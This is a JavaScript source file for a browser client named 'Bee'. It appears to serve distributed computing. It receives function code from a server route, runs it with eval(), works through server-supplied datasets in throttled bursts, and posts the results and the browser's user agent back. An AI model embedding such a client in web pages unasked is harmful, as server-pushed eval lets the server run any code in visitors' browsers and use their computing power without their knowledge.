
function Bee(RoutLink, opts) {
    var asyncClose = true;
    if (opts) {
        asyncClose = opts.async ? opts.async : asyncClose;
    }
    if (!RoutLink) {
        throw new Error('Must enter a valid rout link ')
    }
    var bee = {}
    bee.browser = navigator.userAgent;
    bee.uId = '';
    bee.fnID = '';
    var b4unload = false;
    window.onunload = window.onbeforeunload = function () {
        if (!b4unload) {
            b4unload = true;
            $.ajax({
                type:'POST',
                datatype:'json',
                url: RoutLink,
                data: { type: 'close', uId: bee.uId },
                async: asyncClose,
                success: function (res) {
                }
            });
        }
    };
    bee.initialize = function () {
        $.ajax({
            type:'POST',
            datatype:'json',
            url: RoutLink,
            data: { type: 'new', u_browser: bee.browser },
            success: function (res) {
                bee.uId = res.uId;
                bee.fnID = res.fnID;
                eval("var fun =" + res.fn)
                if (bee.fnID == '0000') {

                } else if (res.type == 'new' ) {
                    bee.Limiter(res.DS.length, res.delay, fun, res.DS)
                } else if (res.type == 'check') {
                    bee.check(res.DS.length, res.delay, fun, res.DS, res.result)
                }
            }
        });
    }

    bee.saveData = function (Data) {
        var reqData = { type: 'save', uId: bee.uId, fnID: bee.fnID, Result: Data, u_browser: bee.browser }
        $.ajax({
            type:'POST',
            url: RoutLink,
            datatype:'json',
            data: reqData ,
            traditional:true,
            success: function (res) {
                bee.uId = res.uId;
                bee.fnID = res.fnID;
                eval("var fun =" + res.fn)
                if (bee.fnID == '0000') {

                } else if (!res.result) {
                    bee.Limiter(res.DS.length, res.delay, fun, res.DS)
                } else {
                    bee.check(res.DS.length, res.delay, fun, res.DS, res.result)
                }

            },error:function(er , ts , s){
            }
        });
    }
    bee.check = function (n, delay, fn, dataSet, Result) {
        var c = 0;
        var results = [];    
        repeater();
        function repeater() {
            var match = true;
            var t = Date.now()
            while (Date.now() < t + 100 && c < n) {
                results.push(fn.apply(this, dataSet[c]));
                if (Result[c] != results[c]) {
                    match = false;
                }
                c++;
            }
            if (c >= n) {
               
                bee.saveData([match, results])
            } else {
                setTimeout(repeater, 400)
            }
        }
    }
    bee.Limiter = function (n, delay, fn, dataSet) {   
        var c = 0;
        var results = [];
        repeater()
        function repeater() {
            var t = Date.now()
            while (Date.now() < t + 100 && c < n) {
                results.push(fn.apply(this, dataSet[c]));
                c++;
            }
            if (c >= n) { 
                
                bee.saveData(results) 
             } else {
                setTimeout(repeater, 400)
            }
        }
    }
    return bee;
}
